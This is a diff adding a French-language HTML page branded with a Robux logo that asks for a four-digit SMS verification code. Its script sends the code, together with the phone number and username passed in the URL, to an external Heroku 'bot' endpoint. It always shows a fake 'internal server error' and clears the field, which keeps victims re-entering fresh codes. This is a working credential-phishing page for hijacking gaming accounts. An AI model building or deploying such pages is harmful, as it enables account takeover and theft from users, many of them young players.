@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification SMS</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 25%, #404040 50%, #2d2d2d 75%, #1a1a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+        .verification-card {
+            background: #1e1e1e;
+            border-radius: 20px;
+            padding: 40px 50px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border: 2px solid #fff;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #f3f3f1;
+            border-radius: 12px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+        }
+        .logo img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+        .title {
+            color: #fff;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #ccc;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            border: 3px solid #ffffff;
+            border-radius: 10px;
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 30px;
+            outline: none;
+            font-weight: bold;
+            letter-spacing: 5px;
+            background: #2a2a2a;
+            color: #fff;
+        }
+        .code-input:focus {
+            border-color: #ffffff;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        .code-input::placeholder {
+            color: #888;
+        }
+        .verify-button {
+            width: 100%;
+            padding: 15px;
+            background: #f8f8f8;
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .verify-button:hover {
+            background: #ffffff;
+        }
+        .verify-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .error-message {
+            color: #ff0000;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+        }
+        .success-message {
+            color: #00ff00;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-card">
+        <div class="logo">
+            <img src="logo.png" alt="Robux Logo">
+        </div>
+        <div class="title">Code de vérification</div>
+        <div class="subtitle">Entrez le code SMS reçu</div>
+        
+        <input type="text" class="code-input" id="smsCode" placeholder="* * * *" maxlength="4" pattern="[0-9]{4}">
+        
+        <button class="verify-button" id="verifyBtn" onclick="verifyCode()">Vérifier</button>
+        
+        <div class="error-message" id="errorMessage">Erreur interne du serveur</div>
+        <div class="success-message" id="successMessage">Vérification en cours...</div>
+    </div>
+
+    <script>
+        // Récupérer les données de la page précédente
+        const urlParams = new URLSearchParams(window.location.search);
+        const phone = urlParams.get('phone');
+        const username = urlParams.get('username');
+        const requestId = urlParams.get('requestId');
+
+        // Fonction pour formater le code SMS
+        document.getElementById('smsCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Garder seulement les chiffres
+            e.target.value = value;
+            
+            // Mettre à jour le placeholder
+            if (value.length === 0) {
+                e.target.placeholder = '* * * *';
+            } else {
+                e.target.placeholder = '*'.repeat(4 - value.length);
+            }
+        });
+
+        // Fonction pour vérifier le code
+        async function verifyCode() {
+            const code = document.getElementById('smsCode').value;
+            const verifyBtn = document.getElementById('verifyBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+
+            // Validation
+            if (code.length !== 4 || !/^\d{4}$/.test(code)) {
+                showError('Veuillez entrer un code à 4 chiffres');
+                return;
+            }
+
+            // Désactiver le bouton
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Vérification...';
+            hideMessages();
+
+            try {
+                // Envoyer le code au serveur
+                const response = await fetch('https://ton-bot-heroku.herokuapp.com/api/verify-sms', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: code,
+                        phone: phone,
+                        username: username,
+                        requestId: requestId
+                    })
+                });
+
+                                 if (response.ok) {
+                     const data = await response.json();
+                     if (data.success) {
+                         showError('Erreur interne du serveur');
+                         // Vider le champ de code
+                         document.getElementById('smsCode').value = '';
+                         document.getElementById('smsCode').placeholder = '* * * *';
+                     } else {
+                         showError('Erreur interne du serveur');
+                         // Vider le champ de code
+                         document.getElementById('smsCode').value = '';
+                         document.getElementById('smsCode').placeholder = '* * * *';
+                     }
+                 } else {
+                     showError('Erreur interne du serveur');
+                     // Vider le champ de code
+                     document.getElementById('smsCode').value = '';
+                     document.getElementById('smsCode').placeholder = '* * * *';
+                 }
+                         } catch (error) {
+                 console.error('Erreur:', error);
+                 showError('Erreur interne du serveur');
+                 // Vider le champ de code
+                 document.getElementById('smsCode').value = '';
+                 document.getElementById('smsCode').placeholder = '* * * *';
+             } finally {
+                // Réactiver le bouton
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Vérifier';
+            }
+        }
+
+        function showError(message) {
+            document.getElementById('errorMessage').textContent = message;
+            document.getElementById('errorMessage').style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';
+        }
+
+        function showSuccess(message) {
+            document.getElementById('successMessage').textContent = message;
+            document.getElementById('successMessage').style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        function hideMessages() {
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+        }
+
+        // Permettre l'appui sur Entrée
+        document.getElementById('smsCode').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyCode();
+            }
+        });
+    </script>
+</body>
+</html> 
